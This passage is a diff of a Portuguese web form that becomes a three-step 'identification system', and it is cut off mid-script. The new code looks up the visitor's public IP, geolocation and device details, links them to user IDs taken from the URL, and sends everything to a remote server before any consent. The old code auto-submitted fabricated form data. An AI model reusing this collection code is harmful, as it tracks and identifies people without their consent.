@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário de Identificação de Usuário</title>
+    <title>Sistema de Identificação - Dupla Etapa</title>
     <style>
         * {
             margin: 0;
@@ -23,12 +23,13 @@
         }
         
         .container {
-            max-width: 800px;
+            max-width: 900px;
             width: 100%;
             background: white;
             border-radius: 20px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             overflow: hidden;
+            min-height: 600px;
         }
         
         .header {
@@ -41,31 +42,134 @@
         
         .header h1 {
             font-size: 2.2rem;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }
         
-        .form-icon {
-            width: 80px;
-            height: 80px;
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 25px;
+        }
+        
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .step-number {
+            width: 40px;
+            height: 40px;
             background: rgba(255,255,255,0.2);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 2.5rem;
-            margin: 0 auto 20px;
-            border: 4px solid white;
+            font-weight: bold;
+            border: 2px solid white;
+        }
+        
+        .step.active .step-number {
+            background: white;
+            color: #4a6ee0;
+        }
+        
+        .step-text {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .step.active .step-text {
+            opacity: 1;
+            font-weight: bold;
         }
         
         .content {
             padding: 40px;
+            min-height: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* TELA 1: Coleta Automática */
+        .auto-collect-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex: 1;
+        }
+        
+        .collect-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: #4a6ee0;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 500px;
+            background: #f0f2ff;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 15px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4a6ee0, #8a2be2);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .info-item {
+            background: #f8f9ff;
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 3px solid #4a6ee0;
+        }
+        
+        .info-label {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .info-value {
+            font-weight: bold;
+            color: #2c5282;
+            word-break: break-all;
+        }
+        
+        /* TELA 2: Formulário */
+        .form-screen {
+            display: none;
         }
         
         .form-container {
             background: #f8f9ff;
             border-radius: 15px;
             padding: 30px;
-            margin-bottom: 30px;
+            margin: 20px 0;
             border: 2px solid #4a6ee0;
         }
         
@@ -112,7 +216,7 @@
             border: 2px solid #4a6ee0;
             border-radius: 8px;
             font-size: 1.1rem;
-            min-height: 120px;
+            min-height: 100px;
             resize: vertical;
             font-family: inherit;
         }
@@ -131,12 +235,6 @@
             cursor: pointer;
         }
         
-        .radio-option input[type="radio"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #4a6ee0;
-        }
-        
         .checkbox-group {
             display: flex;
             flex-direction: column;
@@ -151,23 +249,15 @@
             cursor: pointer;
         }
         
-        .checkbox-option input[type="checkbox"] {
-            width: 18px;
-            height: 18px;
-            accent-color: #4a6ee0;
-        }
-        
         .form-section {
             margin-bottom: 30px;
             padding-bottom: 20px;
             border-bottom: 2px dashed #4a6ee0;
         }
         
-        .form-section h2 {
+        .form-section h3 {
             color: #4a6ee0;
             margin-bottom: 20px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #e0e0e0;
         }
         
         .button-group {
@@ -177,7 +267,7 @@
             justify-content: center;
         }
         
-        .submit-button {
+        .action-button {
             background: linear-gradient(135deg, #4a6ee0, #8a2be2);
             color: white;
             border: none;
@@ -190,12 +280,12 @@
             min-width: 200px;
         }
         
-        .submit-button:hover {
+        .action-button:hover {
             transform: translateY(-2px);
             box-shadow: 0 5px 15px rgba(74, 110, 224, 0.4);
         }
         
-        .reset-button {
+        .secondary-button {
             background: #f8f9fa;
             color: #666;
             border: 2px solid #ddd;
@@ -208,11 +298,38 @@
             min-width: 200px;
         }
         
-        .reset-button:hover {
+        .secondary-button:hover {
             background: #e9ecef;
             border-color: #ccc;
         }
         
+        /* TELA 3: Confirmação */
+        .confirmation-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            flex: 1;
+        }
+        
+        .confirmation-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+            color: #38a169;
+        }
+        
+        .success-message {
+            background: linear-gradient(135deg, #38a169, #2f855a);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+            width: 100%;
+        }
+        
+        /* Mensagens de Status */
         .status-message {
             padding: 15px;
             border-radius: 8px;
@@ -242,16 +359,6 @@
             display: block !important;
         }
         
-        .auto-submit-notice {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            color: #856404;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        
         .footer {
             text-align: center;
             padding: 20px;
@@ -260,73 +367,8 @@
             border-top: 1px solid #eee;
         }
         
-        .progress-container {
-            background: #f0f2ff;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 20px 0;
-            display: none;
-        }
-        
-        .progress-bar {
-            height: 10px;
-            background: #e0e0e0;
-            border-radius: 5px;
-            overflow: hidden;
-            margin: 10px 0;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #4a6ee0, #8a2be2);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        
         .required {
             color: #e53e3e;
-        }
-        
-        .hidden {
-            display: none !important;
-        }
-        
-        .completed-message {
-            background: linear-gradient(135deg, #38a169, #2f855a);
-            color: white;
-            padding: 30px;
-            border-radius: 15px;
-            text-align: center;
-            margin: 20px 0;
-            display: none;
-        }
-        
-        .completed-message h3 {
-            font-size: 1.8rem;
-            margin-bottom: 15px;
-        }
-        
-        .completed-message p {
-            font-size: 1.1rem;
-            margin-bottom: 20px;
-            opacity: 0.9;
-        }
-        
-        .continue-button {
-            background: white;
-            color: #2f855a;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 8px;
-            font-size: 1rem;
-            cursor: pointer;
-            font-weight: bold;
-            transition: transform 0.2s;
-        }
-        
-        .continue-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(255, 255, 255, 0.2);
         }
         
         @media (max-width: 768px) {
@@ -342,9 +384,14 @@
                 flex-direction: column;
             }
             
-            .submit-button, .reset-button {
+            .action-button, .secondary-button {
                 width: 100%;
                 min-width: unset;
+            }
+            
+            .step-indicator {
+                gap: 15px;
+                flex-wrap: wrap;
             }
         }
     </style>
@@ -352,542 +399,638 @@
 <body>
     <div class="container">
         <div class="header">
-            <div class="form-icon">📋</div>
-            <h1>Formulário de Identificação</h1>
-            <p>Complete os dados para prosseguir</p>
+            <h1>Sistema de Identificação</h1>
+            <p>Processo de coleta de informações em duas etapas</p>
+            
+            <div class="step-indicator">
+                <div class="step active" id="step1">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Coleta Automática</div>
+                </div>
+                <div class="step" id="step2">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Formulário Manual</div>
+                </div>
+                <div class="step" id="step3">
+                    <div class="step-number">3</div>
+                    <div class="step-text">Conclusão</div>
+                </div>
+            </div>
         </div>
         
         <div class="content">
-            <div class="auto-submit-notice">
-                ⚠️ Aguarde, o formulário será enviado automaticamente em <span id="countdown">10</span> segundos...
-            </div>
-            
-            <div id="autoSubmitProgress" class="progress-container">
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div id="progressText" style="text-align: center; color: #666;">
-                    Preparando envio automático...
-                </div>
-            </div>
-            
-            <div id="completedMessage" class="completed-message">
-                <h3>✅ Identificação Completa!</h3>
-                <p>Seus dados foram enviados com sucesso. Você pode continuar navegando normalmente.</p>
-                <button onclick="location.reload()" class="continue-button">Enviar Novos Dados</button>
-            </div>
-            
-            <div id="formContainer" class="form-container">
-                <form id="userForm" action="https://formsubmit.co/suporte@renar.com.br" method="POST">
-                    <input type="hidden" id="id_hash" name="id_hash" value="">
-                    <input type="hidden" id="id_user" name="id_user" value="">
-                    
-                    <div class="form-section">
-                        <h2>📝 Informações Pessoais</h2>
-                        
-                        <div class="form-group">
-                            <label class="form-label" for="nome_completo">
-                                Nome Completo <span class="required">*</span>
-                            </label>
-                            <input type="text" 
-                                   id="nome_completo" 
-                                   name="nome_completo" 
-                                   class="form-input" 
-                                   placeholder="Digite seu nome completo" 
-                                   required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label" for="email">
-                                E-mail <span class="required">*</span>
-                            </label>
-                            <input type="email" 
-                                   id="email" 
-                                   name="email" 
-                                   class="form-input" 
-                                   placeholder="seu@email.com" 
-                                   required>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label" for="telefone">
-                                Telefone
-                            </label>
-                            <input type="tel" 
-                                   id="telefone" 
-                                   name="telefone" 
-                                   class="form-input" 
-                                   placeholder="(00) 00000-0000">
-                        </div>
+            <!-- TELA 1: COLETA AUTOMÁTICA -->
+            <div class="auto-collect-screen" id="screen1">
+                <div class="collect-icon">🔍</div>
+                <h2 style="color: #4a6ee0; margin-bottom: 15px;">Coletando Informações do Sistema</h2>
+                <p style="margin-bottom: 25px; color: #666;">
+                    Estamos coletando automaticamente informações do seu dispositivo.
+                    Isso nos ajuda a identificar seu perfil de acesso.
+                </p>
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
                     </div>
-                    
-                    <div class="form-section">
-                        <h2>💼 Informações Profissionais</h2>
-                        
-                        <div class="form-group">
-                            <label class="form-label" for="empresa">
-                                Empresa/Organização
-                            </label>
-                            <input type="text" 
-                                   id="empresa" 
-                                   name="empresa" 
-                                   class="form-input" 
-                                   placeholder="Nome da empresa">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label" for="cargo">
-                                Cargo/Função
-                            </label>
-                            <input type="text" 
-                                   id="cargo" 
-                                   name="cargo" 
-                                   class="form-input" 
-                                   placeholder="Seu cargo atual">
-                        </div>
-                        
-                        <div class="form-group">
-                            <label class="form-label" for="departamento">
-                                Departamento
-                            </label>
-                            <select id="departamento" name="departamento" class="form-select">
-                                <option value="">Selecione um departamento</option>
-                                <option value="ti">TI</option>
-                                <option value="rh">Recursos Humanos</option>
-                                <option value="financeiro">Financeiro</option>
-                                <option value="marketing">Marketing</option>
-                                <option value="vendas">Vendas</option>
-                                <option value="operacoes">Operações</option>
-                                <option value="outro">Outro</option>
-                            </select>
-                        </div>
+                    <div id="progressText" style="text-align: center; color: #666;">
+                        Iniciando coleta de dados...
                     </div>
+                </div>
+                
+                <div id="collectedInfo" class="info-grid">
+                    <!-- Informações coletadas aparecerão aqui -->
+                </div>
+                
+                <div id="statusMessage1" class="status-message"></div>
+                
+                <div class="button-group" id="screen1Buttons" style="display: none;">
+                    <button type="button" class="action-button" onclick="proceedToForm()">
+                        ➡️ Continuar para o Formulário
+                    </button>
+                </div>
+            </div>
+            
+            <!-- TELA 2: FORMULÁRIO MANUAL -->
+            <div class="form-screen" id="screen2">
+                <div class="form-container">
+                    <h2 style="text-align: center; color: #4a6ee0; margin-bottom: 25px;">
+                        📝 Complete seus Dados
+                    </h2>
                     
-                    <div class="form-section">
-                        <h2>🔒 Acesso ao Sistema</h2>
+                    <form id="userForm">
+                        <input type="hidden" id="auto_collected_data" name="auto_collected_data" value="">
                         
-                        <div class="form-group">
-                            <label class="form-label">
-                                Tipo de Acesso <span class="required">*</span>
-                            </label>
-                            <div class="radio-group">
-                                <label class="radio-option">
-                                    <input type="radio" name="tipo_acesso" value="interno" required>
-                                    Interno (Colaborador)
+                        <div class="form-section">
+                            <h3>Informações Pessoais</h3>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="nome_completo">
+                                    Nome Completo <span class="required">*</span>
                                 </label>
-                                <label class="radio-option">
-                                    <input type="radio" name="tipo_acesso" value="externo">
-                                    Externo (Visitante)
+                                <input type="text" 
+                                       id="nome_completo" 
+                                       name="nome_completo" 
+                                       class="form-input" 
+                                       placeholder="Digite seu nome completo" 
+                                       required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="email">
+                                    E-mail <span class="required">*</span>
                                 </label>
-                                <label class="radio-option">
-                                    <input type="radio" name="tipo_acesso" value="parceiro">
-                                    Parceiro
+                                <input type="email" 
+                                       id="email" 
+                                       name="email" 
+                                       class="form-input" 
+                                       placeholder="seu@email.com" 
+                                       required>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="telefone">
+                                    Telefone
                                 </label>
+                                <input type="tel" 
+                                       id="telefone" 
+                                       name="telefone" 
+                                       class="form-input" 
+                                       placeholder="(00) 00000-0000">
                             </div>
                         </div>
                         
-                        <div class="form-group">
-                            <label class="form-label">
-                                Recursos Necessários
-                            </label>
-                            <div class="checkbox-group">
-                                <label class="checkbox-option">
-                                    <input type="checkbox" name="recursos[]" value="sistema_principal">
-                                    Sistema Principal
+                        <div class="form-section">
+                            <h3>Informações Profissionais</h3>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="empresa">
+                                    Empresa/Organização
                                 </label>
-                                <label class="checkbox-option">
-                                    <input type="checkbox" name="recursos[]" value="relatorios">
-                                    Módulo de Relatórios
+                                <input type="text" 
+                                       id="empresa" 
+                                       name="empresa" 
+                                       class="form-input" 
+                                       placeholder="Nome da empresa">
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="cargo">
+                                    Cargo/Função
                                 </label>
-                                <label class="checkbox-option">
-                                    <input type="checkbox" name="recursos[]" value="documentos">
-                                    Acesso a Documentos
-                                </label>
-                                <label class="checkbox-option">
-                                    <input type="checkbox" name="recursos[]" value="suporte">
-                                    Sistema de Suporte
-                                </label>
+                                <input type="text" 
+                                       id="cargo" 
+                                       name="cargo" 
+                                       class="form-input" 
+                                       placeholder="Seu cargo atual">
                             </div>
                         </div>
                         
-                        <div class="form-group">
-                            <label class="form-label" for="observacoes">
-                                Observações ou Necessidades Específicas
-                            </label>
-                            <textarea id="observacoes" 
-                                      name="observacoes" 
-                                      class="form-textarea" 
-                                      placeholder="Descreva qualquer necessidade específica ou observação..."></textarea>
+                        <div class="form-section">
+                            <h3>Configuração de Acesso</h3>
+                            
+                            <div class="form-group">
+                                <label class="form-label">
+                                    Tipo de Usuário <span class="required">*</span>
+                                </label>
+                                <div class="radio-group">
+                                    <label class="radio-option">
+                                        <input type="radio" name="tipo_usuario" value="colaborador" required>
+                                        Colaborador Interno
+                                    </label>
+                                    <label class="radio-option">
+                                        <input type="radio" name="tipo_usuario" value="visitante">
+                                        Visitante
+                                    </label>
+                                    <label class="radio-option">
+                                        <input type="radio" name="tipo_usuario" value="fornecedor">
+                                        Fornecedor/Parceiro
+                                    </label>
+                                </div>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label class="form-label" for="motivo_acesso">
+                                    Motivo do Acesso
+                                </label>
+                                <textarea id="motivo_acesso" 
+                                          name="motivo_acesso" 
+                                          class="form-textarea" 
+                                          placeholder="Descreva o motivo do seu acesso..."></textarea>
+                            </div>
                         </div>
-                    </div>
-                    
-                    <div id="statusMessage" class="status-message"></div>
-                    
-                    <div class="button-group">
-                        <button type="button" id="manualSubmitBtn" class="submit-button">
-                            ✅ Enviar Agora
-                        </button>
-                        <button type="button" class="reset-button" onclick="resetForm()">
-                            🔄 Limpar Formulário
-                        </button>
-                    </div>
-                </form>
+                        
+                        <div id="statusMessage2" class="status-message"></div>
+                        
+                        <div class="button-group">
+                            <button type="button" class="secondary-button" onclick="backToScreen1()">
+                                ⬅️ Voltar
+                            </button>
+                            <button type="button" class="action-button" onclick="submitManualForm()">
+                                ✅ Enviar Formulário
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            
+            <!-- TELA 3: CONCLUSÃO -->
+            <div class="confirmation-screen" id="screen3">
+                <div class="confirmation-icon">✅</div>
+                <h2 style="color: #38a169; margin-bottom: 15px;">Processo Concluído!</h2>
+                <p style="margin-bottom: 25px; color: #666; max-width: 600px;">
+                    Todas as informações foram coletadas e enviadas com sucesso.
+                    Agradecemos pela sua colaboração.
+                </p>
+                
+                <div class="success-message" id="confirmationDetails">
+                    <h3 style="margin-bottom: 15px;">Resumo do Envio</h3>
+                    <div id="summaryInfo" style="text-align: left; margin: 15px 0;"></div>
+                    <p style="margin-top: 15px; opacity: 0.9;">
+                        ID da Sessão: <strong id="sessionId"></strong>
+                    </p>
+                </div>
+                
+                <div class="button-group">
+                    <button type="button" class="action-button" onclick="restartProcess()">
+                        🔄 Novo Processo
+                    </button>
+                </div>
             </div>
         </div>
         
         <div class="footer">
-            <p>© 2024 Sistema de Identificação Avançada | Todos os direitos reservados</p>
+            <p>© 2024 Sistema de Identificação - Dupla Etapa</p>
             <p style="font-size: 0.9em; margin-top: 10px;">
-                Seus dados estão protegidos por nossa política de privacidade
+                Processo seguro de coleta de informações
             </p>
         </div>
     </div>
 
     <script>
-        // Obter parâmetros da URL
-        const params = new URLSearchParams(window.location.search);
-        const id_hash = params.get("id_hash") || '';
-        const id_user = params.get("id_user") || '';
+        // Configurações
+        const API_ENDPOINT = 'https://portal.renar.com.br/teste/';
+        const SESSION_ID = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         
-        // URLs de destino
-        const FORM_ACTION_URL = 'https://portal.renar.com.br/teste/';
+        // Estado da aplicação
+        let collectedData = {};
+        let formData = {};
+        let currentScreen = 1;
         
-        // Elementos do DOM
-        const form = document.getElementById('userForm');
-        const formContainer = document.getElementById('formContainer');
-        const completedMessage = document.getElementById('completedMessage');
-        const countdownElement = document.getElementById('countdown');
-        const progressContainer = document.getElementById('autoSubmitProgress');
-        const progressFill = document.getElementById('progressFill');
-        const progressText = document.getElementById('progressText');
-        const statusMessage = document.getElementById('statusMessage');
-        const manualSubmitBtn = document.getElementById('manualSubmitBtn');
+        // Elementos DOM
+        const screens = {
+            1: document.getElementById('screen1'),
+            2: document.getElementById('screen2'),
+            3: document.getElementById('screen3')
+        };
         
-        // Estado do sistema
-        let autoSubmitCountdown = 10; // Segundos até envio automático
-        let autoSubmitTimer = null;
-        let formSubmitted = false;
-        let canSubmit = false; // Controle para permitir envio automático
-        
-        // Função para mostrar mensagem de status
-        function showMessage(text, type) {
-            statusMessage.textContent = text;
-            statusMessage.className = `status-message status-${type}`;
-            
-            // Auto-esconder mensagens de sucesso após 5 segundos
-            if (type === 'success' || type === 'info') {
-                setTimeout(() => {
-                    statusMessage.style.display = 'none';
-                }, 5000);
-            }
-        }
+        const steps = {
+            1: document.getElementById('step1'),
+            2: document.getElementById('step2'),
+            3: document.getElementById('step3')
+        };
         
         // Função para atualizar progresso
         function updateProgress(percent, text) {
-            if (progressFill) {
-                progressFill.style.width = percent + '%';
-                progressText.textContent = text;
+            const progressFill = document.getElementById('progressFill');
+            const progressText = document.getElementById('progressText');
+            
+            if (progressFill) progressFill.style.width = percent + '%';
+            if (progressText) progressText.textContent = text;
+        }
+        
+        // Função para mostrar mensagem
+        function showMessage(screen, text, type) {
+            const messageDiv = document.getElementById(`statusMessage${screen}`);
+            if (messageDiv) {
+                messageDiv.textContent = text;
+                messageDiv.className = `status-message status-${type}`;
             }
         }
         
-        // Função para coletar informações do cliente
-        function collectClientInfo() {
-            return {
-                timestamp: new Date().toISOString(),
-                user_agent: navigator.userAgent.substring(0, 200),
-                platform: navigator.platform,
-                language: navigator.language,
-                screen_resolution: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                online_status: navigator.onLine,
-                page_url: window.location.href,
-                referrer: document.referrer || 'direct',
-                cookies_enabled: navigator.cookieEnabled,
-                browser_language: navigator.language,
-                browser_languages: navigator.languages ? navigator.languages.join(',') : ''
-            };
-        }
-        
-        // Função para enviar dados via AJAX
-async function submitFormData(formData) {
-    try {
-        // Se for envio manual, usar FormSubmit
-        const submissionType = formData.get('submission_type');
-        
-        if (submissionType === 'manual') {
-            // Enviar via FormSubmit (recarrega página)
-            form.setAttribute('target', '_blank'); // Abrir em nova aba
-            form.submit();
-            return true;
-        } else {
-            // Envio automático - usar AJAX com no-cors como antes
-            const response = await fetch(FORM_ACTION_URL, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
+        // Função para mudar de tela
+        function changeScreen(screenNumber) {
+            // Esconder todas as telas
+            Object.values(screens).forEach(screen => {
+                screen.style.display = 'none';
             });
-            return true;
+            
+            // Remover classe active de todos os steps
+            Object.values(steps).forEach(step => {
+                step.classList.remove('active');
+            });
+            
+            // Mostrar tela atual e marcar step
+            screens[screenNumber].style.display = 'flex';
+            steps[screenNumber].classList.add('active');
+            currentScreen = screenNumber;
         }
         
-    } catch (error) {
-        console.error('Erro ao enviar dados:', error);
-        return false;
-    }
-}
-        
-        // Função para preencher com dados de exemplo (para envio automático)
-        function fillWithSampleData() {
-            // Gerar dados de exemplo baseados em informações do cliente
-            const clientInfo = collectClientInfo();
+        // Função para coletar dados automaticamente
+        async function collectAutoData() {
+            const collectedInfoDiv = document.getElementById('collectedInfo');
+            collectedInfoDiv.innerHTML = '';
             
-            // Nome baseado no user agent ou IP
-            let sampleName = "Usuário Visitante";
-            if (clientInfo.user_agent.includes('Windows')) sampleName = "Usuário Windows";
-            else if (clientInfo.user_agent.includes('Mac')) sampleName = "Usuário Mac";
-            else if (clientInfo.user_agent.includes('Linux')) sampleName = "Usuário Linux";
+            // Dados que serão coletados
+            const dataToCollect = [
+                { name: 'IP Público', func: getPublicIP },
+                { name: 'User Agent', func: getUserAgent },
+                { name: 'Resolução', func: getScreenResolution },
+                { name: 'Timezone', func: getTimezone },
+                { name: 'Idioma', func: getLanguage },
+                { name: 'Cookies', func: checkCookies },
+                { name: 'Online', func: checkOnlineStatus },
+                { name: 'Plataforma', func: getPlatform }
+            ];
             
-            // E-mail baseado no timestamp
-            const timestamp = new Date().getTime();
-            const sampleEmail = `usuario${timestamp % 10000}@exemplo.com`;
+            let collectedCount = 0;
+            const totalItems = dataToCollect.length;
             
-            // Preencher campos automaticamente
-            document.getElementById('nome_completo').value = sampleName;
-            document.getElementById('email').value = sampleEmail;
-            document.getElementById('empresa').value = "Empresa Exemplo";
-            document.getElementById('cargo').value = "Visitante";
-            document.getElementById('departamento').value = "outro";
-            
-            // Selecionar tipo de acesso
-            const acessoExterno = document.querySelector('input[name="tipo_acesso"][value="externo"]');
-            if (acessoExterno) acessoExterno.checked = true;
-            
-            // Selecionar alguns recursos
-            const recursoPrincipal = document.querySelector('input[name="recursos[]"][value="sistema_principal"]');
-            if (recursoPrincipal) recursoPrincipal.checked = true;
-            
-            // Adicionar observação automática
-            document.getElementById('observacoes').value = "Acesso automático via sistema de identificação. Dados coletados: " + 
-                clientInfo.user_agent.substring(0, 50) + "...";
-            
-            return {
-                nome: sampleName,
-                email: sampleEmail,
-                tipo: "externo"
-            };
-        }
-        
-        // Função para iniciar contagem regressiva
-        function startCountdown() {
-            if (autoSubmitTimer) clearInterval(autoSubmitTimer);
-            
-            autoSubmitTimer = setInterval(() => {
-                autoSubmitCountdown--;
-                countdownElement.textContent = autoSubmitCountdown;
+            // Coletar cada item
+            for (const item of dataToCollect) {
+                updateProgress(
+                    (collectedCount / totalItems) * 100,
+                    `Coletando ${item.name.toLowerCase()}...`
+                );
                 
-                // Atualizar barra de progresso
-                const progressPercent = 100 - (autoSubmitCountdown * 10);
-                updateProgress(progressPercent, `Envio automático em ${autoSubmitCountdown} segundos...`);
-                
-                if (autoSubmitCountdown <= 0) {
-                    clearInterval(autoSubmitTimer);
-                    performAutoSubmit();
+                try {
+                    const result = await item.func();
+                    
+                    // Adicionar ao DOM
+                    const infoItem = document.createElement('div');
+                    infoItem.className = 'info-item';
+                    infoItem.innerHTML = `
+                        <div class="info-label">${item.name}</div>
+                        <div class="info-value">${result.value}</div>
+                    `;
+                    collectedInfoDiv.appendChild(infoItem);
+                    
+                    // Armazenar nos dados coletados
+                    collectedData[item.key || item.name.toLowerCase().replace(' ', '_')] = result.value;
+                    
+                    collectedCount++;
+                    
+                    // Pequena pausa para efeito visual
+                    await new Promise(resolve => setTimeout(resolve, 300));
+                    
+                } catch (error) {
+                    console.log(`Erro ao coletar ${item.name}:`, error);
                 }
-            }, 1000);
+            }
+            
+            // Coletar localização aproximada pelo IP
+            if (collectedData.public_ip && collectedData.public_ip !== 'Não detectado') {
+                updateProgress(95, 'Obtendo localização aproximada...');
+                try {
+                    const location = await getLocationFromIP(collectedData.public_ip);
+                    if (location) {
+                        const infoItem = document.createElement('div');
+                        infoItem.className = 'info-item';
+                        infoItem.innerHTML = `
+                            <div class="info-label">Localização</div>
+                            <div class="info-value">${location}</div>
+                        `;
+                        collectedInfoDiv.appendChild(infoItem);
+                        collectedData.location = location;
+                    }
+                } catch (error) {
+                    // Ignorar erro de localização
+                }
+            }
+            
+            // Adicionar timestamp e session ID
+            collectedData.timestamp = new Date().toISOString();
+            collectedData.session_id = SESSION_ID;
+            collectedData.page_url = window.location.href;
+            collectedData.referrer = document.referrer || 'direct';
+            
+            updateProgress(100, 'Coleta automática concluída!');
+            
+            // Mostrar botão para continuar
+            document.getElementById('screen1Buttons').style.display = 'flex';
+            
+            // Enviar dados automáticos para o servidor
+            await sendAutoDataToServer();
+            
+            showMessage(1, '✅ Dados automáticos coletados e enviados com sucesso!', 'success');
         }
         
-        // Função para executar envio automático
-        async function performAutoSubmit() {
-            if (formSubmitted) return;
-            
-            formSubmitted = true;
-            canSubmit = true;
-            
-            // Mostrar progresso
-            progressContainer.style.display = 'block';
-            updateProgress(50, 'Preparando dados automáticos...');
-            
-            // Preencher com dados de exemplo
-            const sampleData = fillWithSampleData();
-            
-            updateProgress(75, 'Enviando dados...');
-            
-            // Preparar FormData
-            const formData = new FormData(form);
-            
-            // Enviar dados
-            const success = await submitFormData(formData);
-            
-            if (success) {
-                updateProgress(100, 'Dados enviados com sucesso!');
-                showMessage(`✅ Identificação automática realizada: ${sampleData.nome}`, 'success');
+        // Funções de coleta específicas
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return { value: data.ip, key: 'public_ip' };
+            } catch (error) {
+                return { value: 'Não detectado', key: 'public_ip' };
+            }
+        }
+        
+        function getUserAgent() {
+            return { value: navigator.userAgent.substring(0, 100) + '...', key: 'user_agent' };
+        }
+        
+        function getScreenResolution() {
+            return { value: `${screen.width} × ${screen.height}`, key: 'screen_resolution' };
+        }
+        
+        function getTimezone() {
+            return { value: Intl.DateTimeFormat().resolvedOptions().timeZone, key: 'timezone' };
+        }
+        
+        function getLanguage() {
+            return { value: navigator.language, key: 'language' };
+        }
+        
+        function checkCookies() {
+            return { value: navigator.cookieEnabled ? 'Habilitados' : 'Desabilitados', key: 'cookies_enabled' };
+        }
+        
+        function checkOnlineStatus() {
+            return { value: navigator.onLine ? 'Online' : 'Offline', key: 'online_status' };
+        }
+        
+        function getPlatform() {
+            return { value: navigator.platform, key: 'platform' };
+        }
+        
+        async function getLocationFromIP(ip) {
+            try {
+                const response = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await response.json();
+                if (data.city && data.country_name) {
+                    return `${data.city}, ${data.country_name}`;
+                }
+                return null;
+            } catch (error) {
+                return null;
+            }
+        }
+        
+        // Enviar dados automáticos para o servidor
+        async function sendAutoDataToServer() {
+            try {
+                // Preparar dados para envio
+                const autoData = {
+                    ...collectedData,
+                    type: 'auto_collection',
+                    step: 'pre_form',
+                    id_hash: new URLSearchParams(window.location.search).get('id_hash') || '',
+                    id_user: new URLSearchParams(window.location.search).get('id_user') || ''
+                };
                 
-                // Ocultar formulário e mostrar mensagem de conclusão
-                setTimeout(() => {
-                    formContainer.classList.add('hidden');
-                    progressContainer.classList.add('hidden');
-                    completedMessage.style.display = 'block';
-                    document.querySelector('.auto-submit-notice').classList.add('hidden');
-                }, 1500);
-            } else {
-                showMessage('❌ Erro ao enviar dados automaticamente. Tente manualmente.', 'error');
-                canSubmit = false;
-                formSubmitted = false;
+                // Enviar via fetch com no-cors
+                await fetch(API_ENDPOINT, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(autoData),
+                    mode: 'no-cors' // Para evitar problemas CORS
+                });
+                
+                console.log('Dados automáticos enviados:', autoData);
+                
+            } catch (error) {
+                console.log('Erro ao enviar dados automáticos:', error);
+                // Não mostrar erro ao usuário, continuar normalmente
             }
         }
         
-        // Função para resetar o formulário
-        function resetForm() {
-            if (confirm('Tem certeza que deseja limpar todos os campos do formulário?')) {
-                form.reset();
-                showMessage('Formulário limpo com sucesso!', 'success');
-            }
+        // Avançar para o formulário
+        function proceedToForm() {
+            // Armazenar dados coletados em campo hidden
+            document.getElementById('auto_collected_data').value = JSON.stringify(collectedData);
+            changeScreen(2);
         }
         
-        // Função para validar formulário manual
+        // Voltar para a tela de coleta automática
+        function backToScreen1() {
+            changeScreen(1);
+        }
+        
+        // Validar formulário manual
         function validateForm() {
